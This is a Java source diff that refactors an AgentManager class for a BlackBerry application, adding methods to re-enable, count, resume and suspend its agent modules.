@@ -9,21 +9,20 @@
 
 package blackberry;
 
+import java.util.Enumeration;
 import java.util.Vector;
 
 import net.rim.device.api.system.RuntimeStore;
-import blackberry.agent.Agent;
+import blackberry.agent.Module;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.interfaces.Singleton;
-import blackberry.threadpool.TimerJob;
-import blackberry.utils.Check;
-
+import blackberry.interfaces.UserAgent;
 
 /**
  * The Class AgentManager.
  */
-public final class AgentManager extends Manager implements Singleton {
+public final class AgentManager extends JobManager implements Singleton {
 
     private static final long GUID = 0xfa169781286585c3L;
 
@@ -54,39 +53,103 @@ public final class AgentManager extends Manager implements Singleton {
     }
 
     /**
-     * Instantiates a new agent manager.
+     * Re enable agent.
+     * 
+     * @param agentId
+     *            the agent id
+     * @return true, if successful
      */
-    private AgentManager() {
-        super();
-    }
+    public synchronized boolean reEnableAgent(final String agentId) {
+        final Module agent = (Module) get(agentId);
 
-    /*
-     * (non-Javadoc)
-     * @see blackberry.Manager#getAllItems()
-     */
-    public Vector getAllItems() {
-        //#ifdef DBC
-        Check.requires(statusObj != null, "Null status");
-        //#endif
-        final Vector agents = statusObj.getAgentsList();
-        return agents;
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.Manager#getItem(int)
-     */
-    public TimerJob getItem(final int id) {
-        //#ifdef DBC
-        Check.requires(statusObj != null, "Null status");
-        //#endif
-        final Agent agent = statusObj.getAgent(id);
-        //#ifdef DBC
-        if(agent!=null){
-            Check.ensures(agent.agentId == id, "Wrong id");
+        if (agent == null) {
+            //#ifdef DEBUG
+            debug.error("cannot renable agent " + agent);
+            //#endif
+            return false;
         }
-        //#endif
 
-        return agent;
+        //#ifdef DEBUG
+        debug.trace("ReEnabling " + agent);
+        //#endif
+        agent.enable(true);
+        return true;
     }
+
+    /**
+     * Re enable agents.
+     * 
+     * @return true, if successful
+     */
+    public synchronized boolean reEnableAgents() {
+        final Enumeration e = hashtable.elements();
+
+        while (e.hasMoreElements()) {
+            final Module agent = (Module) e.nextElement();
+            reEnableAgent(agent.getId());
+        }
+
+        return true;
+    }
+
+    /**
+     * Count enabled agents.
+     * 
+     * @return the int
+     */
+    public synchronized int countEnabledAgents() {
+        int enabled = 0;
+        final Enumeration e = hashtable.elements();
+
+        while (e.hasMoreElements()) {
+            final Module agent = (Module) e.nextElement();
+
+            if (agent.isEnabled()) {
+                enabled++;
+            }
+        }
+
+        return enabled;
+    }
+
+    public void resumeUserAgents() {
+        //#ifdef DEBUG
+        debug.trace("resumeUserAgents");
+        //#endif
+        Vector vector = getAllItems();
+        for (int i = 0; i < vector.size(); i++) {
+            Module agent = (Module) vector.elementAt(i);
+            if (agent instanceof UserAgent) {
+                if (agent.isEnabled() && !agent.isRunning()) {
+                    //#ifdef DEBUG
+
+                    debug.trace("resumeUserAgents: " + agent);
+                    //#endif
+                    start(agent.getId());
+                }
+            }
+        }
+    }
+
+    public void suspendUserAgents() {
+        //#ifdef DEBUG 
+        debug.trace("suspendUserAgents");
+
+        //#endif 
+        Vector vector = getAllItems();
+        for (int i = 0; i < vector.size(); i++) {
+            Module agent = (Module) vector.elementAt(i);
+            if (agent instanceof UserAgent) {
+                if (agent.isEnabled() &&
+
+                agent.isRunning()) {
+                    //#ifdef DEBUG 
+                    debug.trace("suspendUserAgents: " + agent); 
+                    //#endif 
+                    stop(agent.getId());
+                }
+            }
+        }
+    }
+
 }
